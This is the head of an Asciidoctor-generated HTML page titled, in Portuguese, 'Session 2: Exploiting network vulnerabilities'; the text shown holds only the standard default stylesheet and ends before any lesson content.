<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<!--[if IE]><meta http-equiv="X-UA-Compatible" content="IE=edge"><![endif]-->
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="generator" content="Asciidoctor 1.5.7.1">
<title>Sessão 2: Explorando vulnerabilidades em redes</title>
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,600,600italic%7CNoto+Serif:400,400italic,700,700italic%7CDroid+Sans+Mono:400,700">
<style>
/* Asciidoctor default stylesheet | MIT License | http://asciidoctor.org */
/* Uncomment @import statement below to use as custom stylesheet */
/*@import "https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,600,600italic%7CNoto+Serif:400,400italic,700,700italic%7CDroid+Sans+Mono:400,700";*/
article,aside,details,figcaption,figure,footer,header,hgroup,main,nav,section,summary{display:block}
audio,canvas,video{display:inline-block}
audio:not([controls]){display:none;height:0}
script{display:none!important}
html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}
a{background:transparent}
a:focus{outline:thin dotted}
a:active,a:hover{outline:0}
h1{font-size:2em;margin:.67em 0}
abbr[title]{border-bottom:1px dotted}
b,strong{font-weight:bold}
dfn{font-style:italic}
hr{-moz-box-sizing:content-box;box-sizing:content-box;height:0}
mark{background:#ff0;color:#000}
code,kbd,pre,samp{font-family:monospace;font-size:1em}
pre{white-space:pre-wrap}
q{quotes:"\201C" "\201D" "\2018" "\2019"}
small{font-size:80%}
sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}
sup{top:-.5em}
sub{bottom:-.25em}
img{border:0}
svg:not(:root){overflow:hidden}
figure{margin:0}
fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}
legend{border:0;padding:0}
button,input,select,textarea{font-family:inherit;font-size:100%;margin:0}
button,input{line-height:normal}
button,select{text-transform:none}
button,html input[type="button"],input[type="reset"],input[type="submit"]{-webkit-appearance:button;cursor:pointer}
button[disabled],html input[disabled]{cursor:default}
input[type="checkbox"],input[type="radio"]{box-sizing:border-box;padding:0}
button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}
textarea{overflow:auto;vertical-align:top}
table{border-collapse:collapse;border-spacing:0}
*,*::before,*::after{-moz-box-sizing:border-box;-webkit-box-sizing:border-box;box-sizing:border-box}
html,body{font-size:100%}
body{background:#fff;color:rgba(0,0,0,.8);padding:0;margin:0;font-family:"Noto Serif","DejaVu Serif",serif;font-weight:400;font-style:normal;line-height:1;position:relative;cursor:auto;tab-size:4;-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased}
a:hover{cursor:pointer}
img,object,embed{max-width:100%;height:auto}
object,embed{height:100%}
img{-ms-interpolation-mode:bicubic}
.left{float:left!important}
.right{float:right!important}
.text-left{text-align:left!important}
.text-right{text-align:right!important}
.text-center{text-align:center!important}
.text-justify{text-align:justify!important}
.hide{display:none}
img,object,svg{display:inline-block;vertical-align:middle}
textarea{height:auto;min-height:50px}
select{width:100%}
.center{margin-left:auto;margin-right:auto}
.stretch{width:100%}
.subheader,.admonitionblock td.content>.title,.audioblock>.title,.exampleblock>.title,.imageblock>.title,.listingblock>.title,.literalblock>.title,.stemblock>.title,.openblock>.title,.paragraph>.title,.quoteblock>.title,table.tableblock>.title,.verseblock>.title,.videoblock>.title,.dlist>.title,.olist>.title,.ulist>.title,.qlist>.title,.hdlist>.title{line-height:1.45;color:#7a2518;font-weight:400;margin-top:0;margin-bottom:.25em}
div,dl,dt,dd,ul,ol,li,h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6,pre,form,p,blockquote,th,td{margin:0;padding:0;direction:ltr}
a{color:#2156a5;text-decoration:underline;line-height:inherit}
a:hover,a:focus{color:#1d4b8f}
a img{border:none}
p{font-family:inherit;font-weight:400;font-size:1em;line-height:1.6;margin-bottom:1.25em;text-rendering:optimizeLegibility}
p aside{font-size:.875em;line-height:1.35;font-style:italic}
h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{font-family:"Open Sans","DejaVu Sans",sans-serif;font-weight:300;font-style:normal;color:#ba3925;text-rendering:optimizeLegibility;margin-top:1em;margin-bottom:.5em;line-height:1.0125em}
h1 small,h2 small,h3 small,#toctitle small,.sidebarblock>.content>.title small,h4 small,h5 small,h6 small{font-size:60%;color:#e99b8f;line-height:0}
h1{font-size:2.125em}
h2{font-size:1.6875em}
h3,#toctitle,.sidebarblock>.content>.title{font-size:1.375em}
h4,h5{font-size:1.125em}
h6{font-size:1em}
hr{border:solid #ddddd8;border-width:1px 0 0;clear:both;margin:1.25em 0 1.1875em;height:0}
em,i{font-style:italic;line-height:inherit}
strong,b{font-weight:bold;line-height:inherit}
small{font-size:60%;line-height:inherit}
code{font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;font-weight:400;color:rgba(0,0,0,.9)}
ul,ol,dl{font-size:1em;line-height:1.6;margin-bottom:1.25em;list-style-position:outside;font-family:inherit}
ul,ol{margin-left:1.5em}
ul li ul,ul li ol{margin-left:1.25em;margin-bottom:0;font-size:1em}
ul.square li ul,ul.circle li ul,ul.disc li ul{list-style:inherit}
ul.square{list-style-type:square}
ul.circle{list-style-type:circle}
ul.disc{list-style-type:disc}
ol li ul,ol li ol{margin-left:1.25em;margin-bottom:0}
dl dt{margin-bottom:.3125em;font-weight:bold}
dl dd{margin-bottom:1.25em}
abbr,acronym{text-transform:uppercase;font-size:90%;color:rgba(0,0,0,.8);border-bottom:1px dotted #ddd;cursor:help}
abbr{text-transform:none}
blockquote{margin:0 0 1.25em;padding:.5625em 1.25em 0 1.1875em;border-left:1px solid #ddd}
blockquote cite{display:block;font-size:.9375em;color:rgba(0,0,0,.6)}
blockquote cite::before{content:"\2014 \0020"}
blockquote cite a,blockquote cite a:visited{color:rgba(0,0,0,.6)}
blockquote,blockquote p{line-height:1.6;color:rgba(0,0,0,.85)}
@media screen and (min-width:768px){h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{line-height:1.2}
h1{font-size:2.75em}
h2{font-size:2.3125em}
h3,#toctitle,.sidebarblock>.content>.title{font-size:1.6875em}
h4{font-size:1.4375em}}
table{background:#fff;margin-bottom:1.25em;border:solid 1px #dedede}
table thead,table tfoot{background:#f7f8f7}
table thead tr th,table thead tr td,table tfoot tr th,table tfoot tr td{padding:.5em .625em .625em;font-size:inherit;color:rgba(0,0,0,.8);text-align:left}
table tr th,table tr td{padding:.5625em .625em;font-size:inherit;color:rgba(0,0,0,.8)}
table tr.even,table tr.alt,table tr:nth-of-type(even){background:#f8f8f7}
table thead tr th,table tfoot tr th,table tbody tr td,table tr td,table tfoot tr td{display:table-cell;line-height:1.6}
h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{line-height:1.2;word-spacing:-.05em}
h1 strong,h2 strong,h3 strong,#toctitle strong,.sidebarblock>.content>.title strong,h4 strong,h5 strong,h6 strong{font-weight:400}
.clearfix::before,.clearfix::after,.float-group::before,.float-group::after{content:" ";display:table}
.clearfix::after,.float-group::after{clear:both}
*:not(pre)>code{font-size:.9375em;font-style:normal!important;letter-spacing:0;padding:.1em .5ex;word-spacing:-.15em;background-color:#f7f7f8;-webkit-border-radius:4px;border-radius:4px;line-height:1.45;text-rendering:optimizeSpeed;word-wrap:break-word}
*:not(pre)>code.nobreak{word-wrap:normal}
*:not(pre)>code.nowrap{white-space:nowrap}
pre,pre>code{line-height:1.45;color:rgba(0,0,0,.9);font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;font-weight:400;text-rendering:optimizeSpeed}
em em{font-style:normal}
strong strong{font-weight:400}
.keyseq{color:rgba(51,51,51,.8)}
kbd{font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;display:inline-block;color:rgba(0,0,0,.8);font-size:.65em;line-height:1.45;background-color:#f7f7f7;border:1px solid #ccc;-webkit-border-radius:3px;border-radius:3px;-webkit-box-shadow:0 1px 0 rgba(0,0,0,.2),0 0 0 .1em white inset;box-shadow:0 1px 0 rgba(0,0,0,.2),0 0 0 .1em #fff inset;margin:0 .15em;padding:.2em .5em;vertical-align:middle;position:relative;top:-.1em;white-space:nowrap}
.keyseq kbd:first-child{margin-left:0}
.keyseq kbd:last-child{margin-right:0}
.menuseq,.menuref{color:#000}
.menuseq b:not(.caret),.menuref{font-weight:inherit}
.menuseq{word-spacing:-.02em}
.menuseq b.caret{font-size:1.25em;line-height:.8}
.menuseq i.caret{font-weight:bold;text-align:center;width:.45em}
b.button::before,b.button::after{position:relative;top:-1px;font-weight:400}
b.button::before{content:"[";padding:0 3px 0 2px}
b.button::after{content:"]";padding:0 2px 0 3px}
p a>code:hover{color:rgba(0,0,0,.9)}
#header,#content,#footnotes,#footer{width:100%;margin-left:auto;margin-right:auto;margin-top:0;margin-bottom:0;max-width:62.5em;*zoom:1;position:relative;padding-left:.9375em;padding-right:.9375em}
#header::before,#header::after,#content::before,#content::after,#footnotes::before,#footnotes::after,#footer::before,#footer::after{content:" ";display:table}
#header::after,#content::after,#footnotes::after,#footer::after{clear:both}
#content{margin-top:1.25em}
#content::before{content:none}
#header>h1:first-child{color:rgba(0,0,0,.85);margin-top:2.25rem;margin-bottom:0}
#header>h1:first-child+#toc{margin-top:8px;border-top:1px solid #ddddd8}
#header>h1:only-child,body.toc2 #header>h1:nth-last-child(2){border-bottom:1px solid #ddddd8;padding-bottom:8px}
#header .details{border-bottom:1px solid #ddddd8;line-height:1.45;padding-top:.25em;padding-bottom:.25em;padding-left:.25em;color:rgba(0,0,0,.6);display:-ms-flexbox;display:-webkit-flex;display:flex;-ms-flex-flow:row wrap;-webkit-flex-flow:row wrap;flex-flow:row wrap}
#header .details span:first-child{margin-left:-.125em}
#header .details span.email a{color:rgba(0,0,0,.85)}
#header .details br{display:none}
#header .details br+span::before{content:"\00a0\2013\00a0"}
#header .details br+span.author::before{content:"\00a0\22c5\00a0";color:rgba(0,0,0,.85)}
#header .details br+span#revremark::before{content:"\00a0|\00a0"}
#header #revnumber{text-transform:capitalize}
#header #revnumber::after{content:"\00a0"}
#content>h1:first-child:not([class]){color:rgba(0,0,0,.85);border-bottom:1px solid #ddddd8;padding-bottom:8px;margin-top:0;padding-top:1rem;margin-bottom:1.25rem}
#toc{border-bottom:1px solid #efefed;padding-bottom:.5em}
#toc>ul{margin-left:.125em}
#toc ul.sectlevel0>li>a{font-style:italic}
#toc ul.sectlevel0 ul.sectlevel1{margin:.5em 0}
#toc ul{font-family:"Open Sans","DejaVu Sans",sans-serif;list-style-type:none}
#toc li{line-height:1.3334;margin-top:.3334em}
#toc a{text-decoration:none}
#toc a:active{text-decoration:underline}
#toctitle{color:#7a2518;font-size:1.2em}
@media screen and (min-width:768px){#toctitle{font-size:1.375em}
body.toc2{padding-left:15em;padding-right:0}
#toc.toc2{margin-top:0!important;background-color:#f8f8f7;position:fixed;width:15em;left:0;top:0;border-right:1px solid #efefed;border-top-width:0!important;border-bottom-width:0!important;z-index:1000;padding:1.25em 1em;height:100%;overflow:auto}
#toc.toc2 #toctitle{margin-top:0;margin-bottom:.8rem;font-size:1.2em}
#toc.toc2>ul{font-size:.9em;margin-bottom:0}
#toc.toc2 ul ul{margin-left:0;padding-left:1em}
#toc.toc2 ul.sectlevel0 ul.sectlevel1{padding-left:0;margin-top:.5em;margin-bottom:.5em}
body.toc2.toc-right{padding-left:0;padding-right:15em}
body.toc2.toc-right #toc.toc2{border-right-width:0;border-left:1px solid #efefed;left:auto;right:0}}
@media screen and (min-width:1280px){body.toc2{padding-left:20em;padding-right:0}
#toc.toc2{width:20em}
#toc.toc2 #toctitle{font-size:1.375em}
#toc.toc2>ul{font-size:.95em}
#toc.toc2 ul ul{padding-left:1.25em}
body.toc2.toc-right{padding-left:0;padding-right:20em}}
#content #toc{border-style:solid;border-width:1px;border-color:#e0e0dc;margin-bottom:1.25em;padding:1.25em;background:#f8f8f7;-webkit-border-radius:4px;border-radius:4px}
#content #toc>:first-child{margin-top:0}
#content #toc>:last-child{margin-bottom:0}
#footer{max-width:100%;background-color:rgba(0,0,0,.8);padding:1.25em}
#footer-text{color:rgba(255,255,255,.8);line-height:1.44}
#content{margin-bottom:.625em}
.sect1{padding-bottom:.625em}
@media screen and (min-width:768px){#content{margin-bottom:1.25em}
.sect1{padding-bottom:1.25em}}
.sect1:last-child{padding-bottom:0}
.sect1+.sect1{border-top:1px solid #efefed}
#content h1>a.anchor,h2>a.anchor,h3>a.anchor,#toctitle>a.anchor,.sidebarblock>.content>.title>a.anchor,h4>a.anchor,h5>a.anchor,h6>a.anchor{position:absolute;z-index:1001;width:1.5ex;margin-left:-1.5ex;display:block;text-decoration:none!important;visibility:hidden;text-align:center;font-weight:400}
#content h1>a.anchor::before,h2>a.anchor::before,h3>a.anchor::before,#toctitle>a.anchor::before,.sidebarblock>.content>.title>a.anchor::before,h4>a.anchor::before,h5>a.anchor::before,h6>a.anchor::before{content:"\00A7";font-size:.85em;display:block;padding-top:.1em}
#content h1:hover>a.anchor,#content h1>a.anchor:hover,h2:hover>a.anchor,h2>a.anchor:hover,h3:hover>a.anchor,#toctitle:hover>a.anchor,.sidebarblock>.content>.title:hover>a.anchor,h3>a.anchor:hover,#toctitle>a.anchor:hover,.sidebarblock>.content>.title>a.anchor:hover,h4:hover>a.anchor,h4>a.anchor:hover,h5:hover>a.anchor,h5>a.anchor:hover,h6:hover>a.anchor,h6>a.anchor:hover{visibility:visible}
#content h1>a.link,h2>a.link,h3>a.link,#toctitle>a.link,.sidebarblock>.content>.title>a.link,h4>a.link,h5>a.link,h6>a.link{color:#ba3925;text-decoration:none}
#content h1>a.link:hover,h2>a.link:hover,h3>a.link:hover,#toctitle>a.link:hover,.sidebarblock>.content>.title>a.link:hover,h4>a.link:hover,h5>a.link:hover,h6>a.link:hover{color:#a53221}
.audioblock,.imageblock,.literalblock,.listingblock,.stemblock,.videoblock{margin-bottom:1.25em}
.admonitionblock td.content>.title,.audioblock>.title,.exampleblock>.title,.imageblock>.title,.listingblock>.title,.literalblock>.title,.stemblock>.title,.openblock>.title,.paragraph>.title,.quoteblock>.title,table.tableblock>.title,.verseblock>.title,.videoblock>.title,.dlist>.title,.olist>.title,.ulist>.title,.qlist>.title,.hdlist>.title{text-rendering:optimizeLegibility;text-align:left;font-family:"Noto Serif","DejaVu Serif",serif;font-size:1rem;font-style:italic}
table.tableblock.fit-content>caption.title{white-space:nowrap;width:0}
.paragraph.lead>p,#preamble>.sectionbody>[class="paragraph"]:first-of-type p{font-size:1.21875em;line-height:1.6;color:rgba(0,0,0,.85)}
table.tableblock #preamble>.sectionbody>[class="paragraph"]:first-of-type p{font-size:inherit}
.admonitionblock>table{border-collapse:separate;border:0;background:none;width:100%}
.admonitionblock>table td.icon{text-align:center;width:80px}
.admonitionblock>table td.icon img{max-width:none}
.admonitionblock>table td.icon .title{font-weight:bold;font-family:"Open Sans","DejaVu Sans",sans-serif;text-transform:uppercase}
.admonitionblock>table td.content{padding-left:1.125em;padding-right:1.25em;border-left:1px solid #ddddd8;color:rgba(0,0,0,.6)}
.admonitionblock>table td.content>:last-child>:last-child{margin-bottom:0}
.exampleblock>.content{border-style:solid;border-width:1px;border-color:#e6e6e6;margin-bottom:1.25em;padding:1.25em;background:#fff;-webkit-border-radius:4px;border-radius:4px}
.exampleblock>.content>:first-child{margin-top:0}
.exampleblock>.content>:last-child{margin-bottom:0}
.sidebarblock{border-style:solid;border-width:1px;border-color:#e0e0dc;margin-bottom:1.25em;padding:1.25em;background:#f8f8f7;-webkit-border-radius:4px;border-radius:4px}
.sidebarblock>:first-child{margin-top:0}
.sidebarblock>:last-child{margin-bottom:0}
.sidebarblock>.content>.title{color:#7a2518;margin-top:0;text-align:center}
.exampleblock>.content>:last-child>:last-child,.exampleblock>.content .olist>ol>li:last-child>:last-child,.exampleblock>.content .ulist>ul>li:last-child>:last-child,.exampleblock>.content .qlist>ol>li:last-child>:last-child,.sidebarblock>.content>:last-child>:last-child,.sidebarblock>.content .olist>ol>li:last-child>:last-child,.sidebarblock>.content .ulist>ul>li:last-child>:last-child,.sidebarblock>.content .qlist>ol>li:last-child>:last-child{margin-bottom:0}
.literalblock pre,.listingblock pre:not(.highlight),.listingblock pre[class="highlight"],.listingblock pre[class^="highlight "],.listingblock pre.CodeRay,.listingblock pre.prettyprint{background:#f7f7f8}
.sidebarblock .literalblock pre,.sidebarblock .listingblock pre:not(.highlight),.sidebarblock .listingblock pre[class="highlight"],.sidebarblock .listingblock pre[class^="highlight "],.sidebarblock .listingblock pre.CodeRay,.sidebarblock .listingblock pre.prettyprint{background:#f2f1f1}
.literalblock pre,.literalblock pre[class],.listingblock pre,.listingblock pre[class]{-webkit-border-radius:4px;border-radius:4px;word-wrap:break-word;padding:1em;font-size:.8125em}
.literalblock pre.nowrap,.literalblock pre[class].nowrap,.listingblock pre.nowrap,.listingblock pre[class].nowrap{overflow-x:auto;white-space:pre;word-wrap:normal}
@media screen and (min-width:768px){.literalblock pre,.literalblock pre[class],.listingblock pre,.listingblock pre[class]{font-size:.90625em}}
@media screen and (min-width:1280px){.literalblock pre,.literalblock pre[class],.listingblock pre,.listingblock pre[class]{font-size:1em}}
.literalblock.output pre{color:#f7f7f8;background-color:rgba(0,0,0,.9)}
.listingblock pre.highlightjs{padding:0}
.listingblock pre.highlightjs>code{padding:1em;-webkit-border-radius:4px;border-radius:4px}
.listingblock pre.prettyprint{border-width:0}
.listingblock>.content{position:relative}
.listingblock code[data-lang]::before{display:none;content:attr(data-lang);position:absolute;font-size:.75em;top:.425rem;right:.5rem;line-height:1;text-transform:uppercase;color:#999}
.listingblock:hover code[data-lang]::before{display:block}
.listingblock.terminal pre .command::before{content:attr(data-prompt);padding-right:.5em;color:#999}
.listingblock.terminal pre .command:not([data-prompt])::before{content:"$"}
table.pyhltable{border-collapse:separate;border:0;margin-bottom:0;background:none}
table.pyhltable td{vertical-align:top;padding-top:0;padding-bottom:0;line-height:1.45}
table.pyhltable td.code{padding-left:.75em;padding-right:0}
pre.pygments .lineno,table.pyhltable td:not(.code){color:#999;padding-left:0;padding-right:.5em;border-right:1px solid #ddddd8}
pre.pygments .lineno{display:inline-block;margin-right:.25em}
table.pyhltable .linenodiv{background:none!important;padding-right:0!important}
.quoteblock{margin:0 1em 1.25em 1.5em;display:table}
.quoteblock>.title{margin-left:-1.5em;margin-bottom:.75em}
.quoteblock blockquote,.quoteblock blockquote p{color:rgba(0,0,0,.85);font-size:1.15rem;line-height:1.75;word-spacing:.1em;letter-spacing:0;font-style:italic;text-align:justify}
.quoteblock blockquote{margin:0;padding:0;border:0}
.quoteblock blockquote::before{content:"\201c";float:left;font-size:2.75em;font-weight:bold;line-height:.6em;margin-left:-.6em;color:#7a2518;text-shadow:0 1px 2px rgba(0,0,0,.1)}
.quoteblock blockquote>.paragraph:last-child p{margin-bottom:0}
.quoteblock .attribution{margin-top:.5em;margin-right:.5ex;text-align:right}
.quoteblock .quoteblock{margin-left:0;margin-right:0;padding:.5em 0;border-left:3px solid rgba(0,0,0,.6)}
.quoteblock .quoteblock blockquote{padding:0 0 0 .75em}
.quoteblock .quoteblock blockquote::before{display:none}
.verseblock{margin:0 1em 1.25em}
.verseblock pre{font-family:"Open Sans","DejaVu Sans",sans;font-size:1.15rem;color:rgba(0,0,0,.85);font-weight:300;text-rendering:optimizeLegibility}
.verseblock pre strong{font-weight:400}
.verseblock .attribution{margin-top:1.25rem;margin-left:.5ex}
.quoteblock .attribution,.verseblock .attribution{font-size:.9375em;line-height:1.45;font-style:italic}
.quoteblock .attribution br,.verseblock .attribution br{display:none}
.quoteblock .attribution cite,.verseblock .attribution cite{display:block;letter-spacing:-.025em;color:rgba(0,0,0,.6)}
.quoteblock.abstract{margin:0 1em 1.25em;display:block}
.quoteblock.abstract>.title{margin:0 0 .375em;font-size:1.15em;text-align:center}
.quoteblock.abstract blockquote,.quoteblock.abstract blockquote p{word-spacing:0;line-height:1.6}
.quoteblock.abstract blockquote::before,.quoteblock.abstract p::before{display:none}
table.tableblock{max-width:100%;border-collapse:separate}
p.tableblock:last-child{margin-bottom:0}
td.tableblock>.content{margin-bottom:-1.25em}
table.tableblock,th.tableblock,td.tableblock{border:0 solid #dedede}
table.grid-all>thead>tr>.tableblock,table.grid-all>tbody>tr>.tableblock{border-width:0 1px 1px 0}
table.grid-all>tfoot>tr>.tableblock{border-width:1px 1px 0 0}
table.grid-cols>*>tr>.tableblock{border-width:0 1px 0 0}
table.grid-rows>thead>tr>.tableblock,table.grid-rows>tbody>tr>.tableblock{border-width:0 0 1px}
table.grid-rows>tfoot>tr>.tableblock{border-width:1px 0 0}
table.grid-all>*>tr>.tableblock:last-child,table.grid-cols>*>tr>.tableblock:last-child{border-right-width:0}
table.grid-all>tbody>tr:last-child>.tableblock,table.grid-all>thead:last-child>tr>.tableblock,table.grid-rows>tbody>tr:last-child>.tableblock,table.grid-rows>thead:last-child>tr>.tableblock{border-bottom-width:0}
table.frame-all{border-width:1px}
table.frame-sides{border-width:0 1px}
table.frame-topbot,table.frame-ends{border-width:1px 0}
table.stripes-all tr,table.stripes-odd tr:nth-of-type(odd){background:#f8f8f7}
table.stripes-none tr,table.stripes-odd tr:nth-of-type(even){background:none}
th.halign-left,td.halign-left{text-align:left}
th.halign-right,td.halign-right{text-align:right}
th.halign-center,td.halign-center{text-align:center}
th.valign-top,td.valign-top{vertical-align:top}
th.valign-bottom,td.valign-bottom{vertical-align:bottom}
th.valign-middle,td.valign-middle{vertical-align:middle}
table thead th,table tfoot th{font-weight:bold}
tbody tr th{display:table-cell;line-height:1.6;background:#f7f8f7}
tbody tr th,tbody tr th p,tfoot tr th,tfoot tr th p{color:rgba(0,0,0,.8);font-weight:bold}
p.tableblock>code:only-child{background:none;padding:0}
p.tableblock{font-size:1em}
td>div.verse{white-space:pre}
ol{margin-left:1.75em}
ul li ol{margin-left:1.5em}
dl dd{margin-left:1.125em}
dl dd:last-child,dl dd:last-child>:last-child{margin-bottom:0}
ol>li p,ul>li p,ul dd,ol dd,.olist .olist,.ulist .ulist,.ulist .olist,.olist .ulist{margin-bottom:.625em}
ul.checklist,ul.none,ol.none,ul.no-bullet,ol.no-bullet,ol.unnumbered,ul.unstyled,ol.unstyled{list-style-type:none}
ul.no-bullet,ol.no-bullet,ol.unnumbered{margin-left:.625em}
ul.unstyled,ol.unstyled{margin-left:0}
ul.checklist{margin-left:.625em}
ul.checklist li>p:first-child>.fa-square-o:first-child,ul.checklist li>p:first-child>.fa-check-square-o:first-child{width:1.25em;font-size:.8em;position:relative;bottom:.125em}
ul.checklist li>p:first-child>input[type="checkbox"]:first-child{margin-right:.25em}
ul.inline{display:-ms-flexbox;display:-webkit-box;display:flex;-ms-flex-flow:row wrap;-webkit-flex-flow:row wrap;flex-flow:row wrap;list-style:none;margin:0 0 .625em -1.25em}
ul.inline>li{margin-left:1.25em}
.unstyled dl dt{font-weight:400;font-style:normal}
ol.arabic{list-style-type:decimal}
ol.decimal{list-style-type:decimal-leading-zero}
ol.loweralpha{list-style-type:lower-alpha}
ol.upperalpha{list-style-type:upper-alpha}
ol.lowerroman{list-style-type:lower-roman}
ol.upperroman{list-style-type:upper-roman}
ol.lowergreek{list-style-type:lower-greek}
.hdlist>table,.colist>table{border:0;background:none}
.hdlist>table>tbody>tr,.colist>table>tbody>tr{background:none}
td.hdlist1,td.hdlist2{vertical-align:top;padding:0 .625em}
td.hdlist1{font-weight:bold;padding-bottom:1.25em}
.literalblock+.colist,.listingblock+.colist{margin-top:-.5em}
.colist td:not([class]):first-child{padding:.4em .75em 0;line-height:1;vertical-align:top}
.colist td:not([class]):first-child img{max-width:none}
.colist td:not([class]):last-child{padding:.25em 0}
.thumb,.th{line-height:0;display:inline-block;border:solid 4px #fff;-webkit-box-shadow:0 0 0 1px #ddd;box-shadow:0 0 0 1px #ddd}
.imageblock.left,.imageblock[style*="float: left"]{margin:.25em .625em 1.25em 0}
.imageblock.right,.imageblock[style*="float: right"]{margin:.25em 0 1.25em .625em}
.imageblock>.title{margin-bottom:0}
.imageblock.thumb,.imageblock.th{border-width:6px}
.imageblock.thumb>.title,.imageblock.th>.title{padding:0 .125em}
.image.left,.image.right{margin-top:.25em;margin-bottom:.25em;display:inline-block;line-height:0}
.image.left{margin-right:.625em}
.image.right{margin-left:.625em}
a.image{text-decoration:none;display:inline-block}
a.image object{pointer-events:none}
sup.footnote,sup.footnoteref{font-size:.875em;position:static;vertical-align:super}
sup.footnote a,sup.footnoteref a{text-decoration:none}
sup.footnote a:active,sup.footnoteref a:active{text-decoration:underline}
#footnotes{padding-top:.75em;padding-bottom:.75em;margin-bottom:.625em}
#footnotes hr{width:20%;min-width:6.25em;margin:-.25em 0 .75em;border-width:1px 0 0}
#footnotes .footnote{padding:0 .375em 0 .225em;line-height:1.3334;font-size:.875em;margin-left:1.2em;margin-bottom:.2em}
#footnotes .footnote a:first-of-type{font-weight:bold;text-decoration:none;margin-left:-1.05em}
#footnotes .footnote:last-of-type{margin-bottom:0}
#content #footnotes{margin-top:-.625em;margin-bottom:0;padding:.75em 0}
.gist .file-data>table{border:0;background:#fff;width:100%;margin-bottom:0}
.gist .file-data>table td.line-data{width:99%}
div.unbreakable{page-break-inside:avoid}
.big{font-size:larger}
.small{font-size:smaller}
.underline{text-decoration:underline}
.overline{text-decoration:overline}
.line-through{text-decoration:line-through}
.aqua{color:#00bfbf}
.aqua-background{background-color:#00fafa}
.black{color:#000}
.black-background{background-color:#000}
.blue{color:#0000bf}
.blue-background{background-color:#0000fa}
.fuchsia{color:#bf00bf}
.fuchsia-background{background-color:#fa00fa}
.gray{color:#606060}
.gray-background{background-color:#7d7d7d}
.green{color:#006000}
.green-background{background-color:#007d00}
.lime{color:#00bf00}
.lime-background{background-color:#00fa00}
.maroon{color:#600000}
.maroon-background{background-color:#7d0000}
.navy{color:#000060}
.navy-background{background-color:#00007d}
.olive{color:#606000}
.olive-background{background-color:#7d7d00}
.purple{color:#600060}
.purple-background{background-color:#7d007d}
.red{color:#bf0000}
.red-background{background-color:#fa0000}
.silver{color:#909090}
.silver-background{background-color:#bcbcbc}
.teal{color:#006060}
.teal-background{background-color:#007d7d}
.white{color:#bfbfbf}
.white-background{background-color:#fafafa}
.yellow{color:#bfbf00}
.yellow-background{background-color:#fafa00}
span.icon>.fa{cursor:default}
a span.icon>.fa{cursor:inherit}
.admonitionblock td.icon [class^="fa icon-"]{font-size:2.5em;text-shadow:1px 1px 2px rgba(0,0,0,.5);cursor:default}
.admonitionblock td.icon .icon-note::before{content:"\f05a";color:#19407c}
.admonitionblock td.icon .icon-tip::before{content:"\f0eb";text-shadow:1px 1px 2px rgba(155,155,0,.8);color:#111}
.admonitionblock td.icon .icon-warning::before{content:"\f071";color:#bf6900}
.admonitionblock td.icon .icon-caution::before{content:"\f06d";color:#bf3400}
.admonitionblock td.icon .icon-important::before{content:"\f06a";color:#bf0000}
.conum[data-value]{display:inline-block;color:#fff!important;background-color:rgba(0,0,0,.8);-webkit-border-radius:100px;border-radius:100px;text-align:center;font-size:.75em;width:1.67em;height:1.67em;line-height:1.67em;font-family:"Open Sans","DejaVu Sans",sans-serif;font-style:normal;font-weight:bold}
.conum[data-value] *{color:#fff!important}
.conum[data-value]+b{display:none}
.conum[data-value]::after{content:attr(data-value)}
pre .conum[data-value]{position:relative;top:-.125em}
b.conum *{color:inherit!important}
.conum:not([data-value]):empty{display:none}
dt,th.tableblock,td.content,div.footnote{text-rendering:optimizeLegibility}
h1,h2,p,td.content,span.alt{letter-spacing:-.01em}
p strong,td.content strong,div.footnote strong{letter-spacing:-.005em}
p,blockquote,dt,td.content,span.alt{font-size:1.0625rem}
p{margin-bottom:1.25rem}
.sidebarblock p,.sidebarblock dt,.sidebarblock td.content,p.tableblock{font-size:1em}
.exampleblock>.content{background-color:#fffef7;border-color:#e0e0dc;-webkit-box-shadow:0 1px 4px #e0e0dc;box-shadow:0 1px 4px #e0e0dc}
.print-only{display:none!important}
@page{margin:1.25cm .75cm}
@media print{*{-webkit-box-shadow:none!important;box-shadow:none!important;text-shadow:none!important}
html{font-size:80%}
a{color:inherit!important;text-decoration:underline!important}
a.bare,a[href^="#"],a[href^="mailto:"]{text-decoration:none!important}
a[href^="http:"]:not(.bare)::after,a[href^="https:"]:not(.bare)::after{content:"(" attr(href) ")";display:inline-block;font-size:.875em;padding-left:.25em}
abbr[title]::after{content:" (" attr(title) ")"}
pre,blockquote,tr,img,object,svg{page-break-inside:avoid}
thead{display:table-header-group}
svg{max-width:100%}
p,blockquote,dt,td.content{font-size:1em;orphans:3;widows:3}
h2,h3,#toctitle,.sidebarblock>.content>.title{page-break-after:avoid}
#toc,.sidebarblock,.exampleblock>.content{background:none!important}
#toc{border-bottom:1px solid #ddddd8!important;padding-bottom:0!important}
body.book #header{text-align:center}
body.book #header>h1:first-child{border:0!important;margin:2.5em 0 1em}
body.book #header .details{border:0!important;display:block;padding:0!important}
body.book #header .details span:first-child{margin-left:0!important}
body.book #header .details br{display:block}
body.book #header .details br+span::before{content:none!important}
body.book #toc{border:0!important;text-align:left!important;padding:0!important;margin:0!important}
body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-break-before:always}
.listingblock code[data-lang]::before{display:block}
#footer{padding:0 .9375em}
.hide-on-print{display:none!important}
.print-only{display:block!important}
.hide-for-print{display:none!important}
.show-for-print{display:inherit!important}}
@media print,amzn-kf8{#header>h1:first-child{margin-top:1.25rem}
.sect1{padding:0!important}
.sect1+.sect1{border:0}
#footer{background:none}
#footer-text{color:rgba(0,0,0,.6);font-size:.9em}}
